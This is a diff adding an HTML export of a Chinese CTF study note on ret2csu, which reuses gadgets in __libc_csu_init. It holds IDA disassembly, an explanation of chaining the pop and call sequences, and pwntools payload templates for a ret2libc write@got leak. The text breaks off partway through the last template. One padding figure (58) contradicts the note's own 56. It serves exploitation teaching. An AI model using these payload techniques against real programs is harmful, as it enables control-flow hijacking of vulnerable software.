@@ -1,0 +1,773 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>【gadget】__libc_csu_init 里的”通用gadgets“</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: undefined; }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-transparentGray { background-color: undefined; }
+.select-value-color-translucentGray { background-color: undefined; }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="f54552f4-ab9c-4e97-8fa5-adb5e27f9e3b" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1488554378835-f7acf46e6c98?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/chess-queen_gray.svg"/></div><h1 class="page-title">【gadget】__libc_csu_init 里的”通用gadgets“</h1><p class="page-description"></p></header><div class="page-body"><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="9955d44b-33f8-4e2f-9daf-a44d046be456"><div style="font-size:1.5em"><span class="icon">♟️</span></div><div style="width:100%">The world puts off its mask of vastness to its lover. It becomes small as one song, as one kiss of the eternal.<p id="cbe43a96-e279-4c56-93fc-25d82eb5828e" class="">世界对着它的爱人，扯下它那庞大的面具。它变小了，小得宛如一首歌，小得宛如一个永恒的吻。</p></div></figure><h3 id="b5b06639-44b0-4208-999a-67f0cd2bc978" class="">定义</h3><p id="f6f239e8-8dbb-4477-a714-c82957397160" class="">这个函数是用来对 libc 进行初始化操作的，它的实现代码是写在elf文件里面的，所以就导致只要你是用动态链接glibc出的栈题，一般都是有这个通用gadget可以用的。</p><blockquote id="ddb87a9f-bcce-41ea-8752-1c42ac58b3cc" class="">一般是这样的两种情况下不能用这个通用gadgets：<p id="cda3d2d6-f8c8-4a06-8210-66ca756472b4" class="">1、狼灭出题人，把所有要用到read、write这些C标准函数的地方改成用内联汇编方式自己写mov eax和syscall语句</p><p id="c4f90952-2d02-44ca-b0bc-45abf70e97d7" class="">2、静态链接程序</p></blockquote><h3 id="63b2c93c-8a9e-456e-91ff-db526b2327d3" class="">汇编代码内容</h3><ul id="b874ccd5-4f81-4da6-9e0a-1a99a8dd830e" class="toggle"><li><details open=""><summary>其汇编代码内容如下</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="32a8a1eb-cf0e-43b1-ac10-2baba5d8b1b0" class="code"><code class="language-Python">.text:00000000004005C0
+.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================  ; ida写这么一行就表示这是个子程序（一般是函数）的开始
+.text:00000000004005C0
+.text:00000000004005C0
+.text:00000000004005C0 ; void _libc_csu_init(void)
+.text:00000000004005C0                 public __libc_csu_init
+.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
+.text:00000000004005C0 ; __unwind {
+.text:00000000004005C0                 push    r15
+.text:00000000004005C2                 push    r14
+.text:00000000004005C4                 mov     r15d, edi
+.text:00000000004005C7                 push    r13
+.text:00000000004005C9                 push    r12
+.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
+.text:00000000004005D2                 push    rbp
+.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
+.text:00000000004005DA                 push    rbx
+.text:00000000004005DB                 mov     r14, rsi
+.text:00000000004005DE                 mov     r13, rdx
+.text:00000000004005E1                 sub     rbp, r12
+.text:00000000004005E4                 sub     rsp, 8
+.text:00000000004005E8                 sar     rbp, 3
+.text:00000000004005EC                 call    _init_proc
+.text:00000000004005F1                 test    rbp, rbp
+.text:00000000004005F4                 jz      short loc_400616
+.text:00000000004005F6                 xor     ebx, ebx
+.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
+.text:0000000000400600
+.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp
+.text:0000000000400614                 jnz     short loc_400600
+.text:0000000000400616
+.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn
+.text:0000000000400624 ; } // starts at 4005C0
+.text:0000000000400624 __libc_csu_init endp
+.text:0000000000400624
+.text:0000000000400624 ; ---------------------------------------------------------------------------</code></pre></details></li></ul><h3 id="7fd0dd47-76c4-44a5-881b-22ff73a95723" class="">gadgets</h3><ul id="2cdb0d39-3e28-4a79-b2a9-b68bab7b433e" class="toggle"><li><details open=""><summary><strong>gadgets1:带3参数的任意函数调用并ret2main</strong></summary><p id="489977bc-6f27-4590-a9af-55566185e943" class=""><strong>【漏洞原理】</strong></p><p id="69bc9282-9c55-401b-8b38-867b5cfc8b3c" class="">其中主要的两段如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a184076-0bc4-414b-84bf-6381981c1651" class="code"><code class="language-Python">.text:0000000000400600                 loc_400600:
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbp, rbx
+.text:0000000000400614                 jnz     short loc_400600
+
+.text:0000000000400616                 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn</code></pre><p id="96b125bb-a613-4a6d-b123-05c8edeba5ed" class="">对它的控制分为两个思想：</p><p id="d7ec3bce-6bcb-4f6e-a3ab-a9c2cf952c49" class="">1、控制函数执行<div class="indented"><p id="ad1b419c-cf57-43bd-8d23-4b2fe598cbcf" class="">我们可以先ret到第二段的000000000040061A（这里我们叫他“ppppppr_addr”）开始，控制r12+rbx*8的值为我们要跳转到的目标函数，r13、r14和r15分别为第三、第二、第一个传参，然后控制ret到0000000000400600（这里我们叫他“mmmc_addr”）</p><p id="96caf97a-7273-4040-97f4-71027f6e3dc1" class="">这样就可以实现控制执行最多三个参数的函数</p></div></p><p id="c3265a65-ce6d-4879-9f15-af5ea22d6f83" class="">2、控制函数执行后ret到我们想要的下一个劫持gadget<div class="indented"><p id="70f59c10-9f74-4233-ab95-44243592b64d" class="">函数执行后，就是ret到<code>.text:000000000040060D    add rbx, 1</code>语句处，然后循环地执行loc_400600的这段代码，每个循环会让rbx++直到rbx=rbp才会跳出循坏来到loc_400616</p><p id="8ca1bff8-00bd-409b-ad5b-d159cc267cee" class="">但是这个rbx和rbp都是可以在前面ret2ppppppr_addr时控制的，所以我们可以在那个时候直接控制rbx=0，rbp=1就可以让循环只执行一次就跳出到loc_400616</p><p id="73653649-dc08-4c9e-94c8-69ea1d22916b" class="">跳出到loc_400616后还需要进行六次pop才到ret，加上前面的call会入栈一个返回地址，所以“这个六次pop后的ret的retaddr到我们第一次ret2mmmc_addr的retaddr”之间的偏移是7*8B，要在前面垫58个“A”</p></div></p><p id="e617e9cd-5db6-4c2a-b135-e4aa53229f08" class=""><strong>【利用模板】</strong></p><p id="615483f6-8042-411a-a152-afacc7d360be" class="">可以实现控制3传参+函数执行，并且自定义retaddr</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="db3285e9-63c5-4923-90b7-c8bb3528c257" class="code"><code class="language-Python">mmmc_addr=...
+ppppppr_addr=.....
+payload=...+p64(ppppppr_addr)+p64(0)+p64(1)+p64(函数@got)+p64(传参3)+p64(传参2)+p64(传参1)+&#x27;A&#x27;*56+p64(下一个劫持gadget地址)</code></pre><p id="490bbd65-3dd4-4d0d-b43c-b51a2496f061" class=""><strong>【ret2libc模板】</strong></p><p id="803dce2d-cddb-4a1b-86bb-3c1482071574" class="">以一个x64的ret2libc可利用write泄漏libc基址题目为例：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b1e2721f-4017-43b2-878f-89668d1c5ef4" class="code"><code class="language-Python">pop_addr = 0x40061a          
+write_got = elf.got[&#x27;write&#x27;]
+mov_addr = 0x400600
+main_addr = elf.symbols[&#x27;main&#x27;]
+
+payload0 = &#x27;A&#x27;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) #这里是程序通过溢出口ret到0x40061A然后一路pop到0x400624处ret到0x40600
+payload0 += &#x27;a&#x27;*(0x8+8*6) + p64(main_addr)#这里是read泄露完libc返回后，通过jne不跳后顺序下来执行0x40061A然后一路pop到0x400624处ret2main
